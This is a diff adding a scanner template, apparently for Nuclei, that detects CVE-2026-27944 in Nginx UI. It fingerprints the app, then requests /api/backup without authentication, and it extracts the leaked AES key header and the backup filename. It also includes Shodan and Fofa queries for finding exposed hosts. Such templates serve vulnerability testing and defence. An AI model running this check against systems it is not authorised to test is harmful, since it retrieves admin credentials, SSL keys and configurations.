@@ -1,0 +1,124 @@
+id: vt-2026-27944
+
+info:
+  name: Nginx UI - Unauthenticated Backup Download with Encryption Key Disclosure
+  author: omarkurt
+  severity: critical
+  description: |
+    Nginx UI versions prior to 2.3.3 allow unauthenticated attackers to download
+    encrypted system backups via the /api/backup endpoint. The response includes
+    the AES encryption key and IV in the X-Backup-Security header, allowing
+    immediate decryption of the backup containing admin credentials, SSL keys,
+    and Nginx configurations.
+  reference:
+    - https://nvd.nist.gov/vuln/detail/CVE-2026-27944
+    - https://github.com/advisories/GHSA-4x88-6m79-q5g5
+    - https://www.tenable.com/security/research/tra-2026-17
+    - https://www.thehackerwire.com/nginx-ui-unauthenticated-backup-disclosure-cve-2026-27944/
+    - https://vulnerabletarget.com/VT-2026-27944
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+    cve-id: CVE-2026-27944
+    cwe-id: CWE-306
+  metadata:
+    verified: true
+    max-request: 2
+    vendor: 0xjacky
+    product: nginx-ui
+    shodan-query: http.title:"nginx ui"
+    fofa-query: title="nginx ui"
+  tags: cve,cve2026,nginx-ui,backup,information-disclosure,unauthenticated,critical,intrusive
+
+flow: |
+  http(1) && http(2)
+
+http:
+  # Step 1: Verify Nginx UI is running
+  - method: GET
+    path:
+      - "{{BaseURL}}/"
+    
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "nginx ui"
+          - "Nginx UI"
+        condition: or
+        
+    extractors:
+      - type: regex
+        part: body
+        group: 1
+        name: nginx_ui_title
+        regex:
+          - "<title>([^<]+)</title>"
+
+  # Step 2: Exploit - Attempt backup download
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/backup"
+    
+    matchers-condition: and
+    matchers:
+      # Confirm vulnerability - X-Backup-Security header exposes encryption keys
+      - type: word
+        part: header
+        words:
+          - "X-Backup-Security"
+        condition: and
+
+      # Verify it's a downloadable backup file
+      - type: word
+        part: header
+        words:
+          - "attachment"
+          - "filename="
+        condition: and
+
+      # Confirm response is a file download (not error page)
+      - type: word
+        part: header
+        words:
+          - "application/zip"
+          - "application/octet-stream"
+        condition: or
+
+      # Status must be 200 OK
+      - type: status
+        status:
+          - 200
+
+      # Negative matcher - ensure not an error response
+      - type: word
+        part: body
+        words:
+          - '"error"'
+          - '"message":"not found"'
+        negative: true
+        condition: or
+
+    extractors:
+      # Extract the encryption keys for verification
+      - type: regex
+        part: header
+        group: 1
+        name: x_backup_security
+        regex:
+          - "(?i)X-Backup-Security:\\s*([^\\r\\n]+)"
+
+      # Extract filename
+      - type: regex
+        part: header
+        group: 1
+        name: backup_filename
+        regex:
+          - "filename=\"?([^\";\\r\\n]+)\"?"
+
+      # Extract full header for reference
+      - type: kval
+        part: header
+        kval:
+          - X-Backup-Security
+          - Content-Disposition
